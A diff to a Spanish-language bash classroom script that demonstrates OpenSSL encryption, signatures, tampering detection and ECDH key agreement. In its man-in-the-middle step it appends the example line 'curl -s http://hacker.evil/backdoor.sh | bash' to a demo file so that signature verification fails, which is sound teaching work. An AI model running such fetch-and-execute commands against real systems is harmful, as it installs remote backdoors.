@@ -21,10 +21,27 @@ set -uo pipefail
 
 AUTO_MODE=false
 AUTO_WAIT=0
-if [[ "${1:-}" == "--auto" ]]; then
-    AUTO_MODE=true
-    AUTO_WAIT="${2:-2}"
-fi
+CLEAN_ONLY=false
+while [[ $# -gt 0 ]]; do
+    case "$1" in
+        --auto)
+            AUTO_MODE=true
+            AUTO_WAIT="${2:-2}"
+            shift 2
+            ;;
+        --clean|--limpiar)
+            CLEAN_ONLY=true
+            shift
+            ;;
+        --help|-h)
+            echo "Uso: ./demo_criptografia_llaves.sh [--auto <segundos>] [--clean|--limpiar]"
+            exit 0
+            ;;
+        *)
+            shift
+            ;;
+    esac
+done
 
 # Colores ANSI
 C_RESET="\033[0m"
@@ -42,11 +59,13 @@ WORKDIR=$(mktemp -d /tmp/demo_crypto_XXXXXX)
 
 cleanup() {
     echo -e "\n${C_YELLOW}🧹 [LIMPIEZA] Eliminando claves temporales y archivos de demostración...${C_RESET}"
-    if [ -d "$WORKDIR" ]; then
-        rm -rf "$WORKDIR"
-    fi
+    rm -rf "$WORKDIR" /tmp/demo_crypto_* 2>/dev/null || true
     echo -e "${C_GREEN}✔ Entorno limpio. Ninguna clave quedó expuesta en disco.${C_RESET}\n"
 }
+if [ "$CLEAN_ONLY" = true ]; then
+    cleanup
+    exit 0
+fi
 trap cleanup EXIT INT TERM
 
 # Configuración amigable para TMUX
@@ -150,7 +169,7 @@ echo -e "\n4. Descifrando el archivo con la MISMA clave secreta:"
 run_and_show "openssl enc -d -aes-256-cbc -pbkdf2 -in $WORKDIR/balance_cifrado.enc -out $WORKDIR/balance_recuperado.txt -k 'ClaseLinux2026!' && cat $WORKDIR/balance_recuperado.txt"
 
 echo -e "\n5. Efecto Avalancha: ¿Qué ocurre si un atacante altera un solo byte del archivo cifrado?"
-printf '\xFF' | dd of="$WORKDIR/balance_corrupto.enc" conv=notrunc bs=1 count=1 seek=24 2>/dev/null
+run_and_show "cp $WORKDIR/balance_cifrado.enc $WORKDIR/balance_corrupto.enc && printf '\xFF' | dd of=$WORKDIR/balance_corrupto.enc conv=notrunc bs=1 count=1 seek=24 2>/dev/null"
 run_and_show "openssl enc -d -aes-256-cbc -pbkdf2 -in $WORKDIR/balance_corrupto.enc -out $WORKDIR/descifrado_fallido.txt -k 'ClaseLinux2026!' 2>&1 || true"
 echo -e "${C_RED}✖ Fallo catastrófico:${C_RESET} El padding o bloque quedó destruido. La matemática simétrica no tolera manipulación."
 
@@ -212,8 +231,7 @@ run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature
 echo -e "${C_GREEN}✔ AUTENTICACIÓN EXITOSA:${C_RESET} El servidor verificó la identidad del cliente sin haber visto nunca la clave privada."
 
 echo -e "\n6. ¿Qué ocurre si un impostor intenta autenticarse firmando con otra clave privada?"
-openssl genpkey -algorithm RSA -out "$WORKDIR/clave_impostor.pem" -pkeyopt rsa_keygen_bits:2048 2>/dev/null
-openssl dgst -sha256 -sign "$WORKDIR/clave_impostor.pem" -out "$WORKDIR/firma_falsa.bin" "$WORKDIR/reto_servidor.txt"
+run_and_show "openssl genpkey -algorithm RSA -out $WORKDIR/clave_impostor.pem -pkeyopt rsa_keygen_bits:2048 2>/dev/null && openssl dgst -sha256 -sign $WORKDIR/clave_impostor.pem -out $WORKDIR/firma_falsa.bin $WORKDIR/reto_servidor.txt"
 run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature $WORKDIR/firma_falsa.bin $WORKDIR/reto_servidor.txt 2>&1 || true"
 echo -e "${C_RED}✖ ACCESO DENEGADO (Permission Denied):${C_RESET} La firma no coincide con la clave pública autorizada."
 
@@ -245,8 +263,7 @@ run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature
 echo -e "${C_GREEN}✔ FIRMA VÁLIDA:${C_RESET} El script proviene legítimamente del autor autorizado."
 
 echo -e "\n4. Ataque Man-in-the-Middle: Un atacante altera una línea del script para inyectar código malicioso:"
-echo 'curl -s http://hacker.evil/backdoor.sh | bash' >> "$WORKDIR/despliegue_produccion.sh"
-run_and_show "tail -n 2 $WORKDIR/despliegue_produccion.sh"
+run_and_show "echo 'curl -s http://hacker.evil/backdoor.sh | bash' >> $WORKDIR/despliegue_produccion.sh && tail -n 2 $WORKDIR/despliegue_produccion.sh"
 
 echo -e "\n5. El sistema vuelve a verificar la firma del archivo adulterado:"
 run_and_show "openssl dgst -sha256 -verify $WORKDIR/clave_publica.pem -signature $WORKDIR/despliegue.sig $WORKDIR/despliegue_produccion.sh 2>&1 || true"
@@ -264,10 +281,8 @@ step_banner "5" "Criptografía Híbrida en Acción (El Acuerdo Secreto de Claves
 explain "¿Cómo se combinan ambos mundos? En el apretón de manos (Handshake), se usa criptografía asimétrica efímera (ECDH) para acordar una clave simétrica temporal sin enviarla por la red. Luego, el tráfico masivo viaja con AES-GCM a velocidad nativa."
 
 echo -e "\n1. Generando parámetros de curva elíptica efímeros para el Cliente y el Servidor:"
-openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out "$WORKDIR/cliente_ec.pem" 2>/dev/null
-openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out "$WORKDIR/servidor_ec.pem" 2>/dev/null
-openssl ec -pubout -in "$WORKDIR/cliente_ec.pem" -out "$WORKDIR/cliente_pub.pem" 2>/dev/null
-openssl ec -pubout -in "$WORKDIR/servidor_ec.pem" -out "$WORKDIR/servidor_pub.pem" 2>/dev/null
+run_and_show "openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out $WORKDIR/cliente_ec.pem 2>/dev/null && openssl ec -pubout -in $WORKDIR/cliente_ec.pem -out $WORKDIR/cliente_pub.pem 2>/dev/null"
+run_and_show "openssl genpkey -algorithm EC -pkeyopt ec_paramgen_curve:P-256 -out $WORKDIR/servidor_ec.pem 2>/dev/null && openssl ec -pubout -in $WORKDIR/servidor_ec.pem -out $WORKDIR/servidor_pub.pem 2>/dev/null"
 
 echo -e "  - ${C_CYAN}Cliente genera Clave Pública efímera:${C_RESET} $(cut -c 1-35 "$WORKDIR/cliente_pub.pem" | head -n 2 | tr -d '\n')..."
 echo -e "  - ${C_MAGENTA}Servidor genera Clave Pública efímera:${C_RESET} $(cut -c 1-35 "$WORKDIR/servidor_pub.pem" | head -n 2 | tr -d '\n')..."
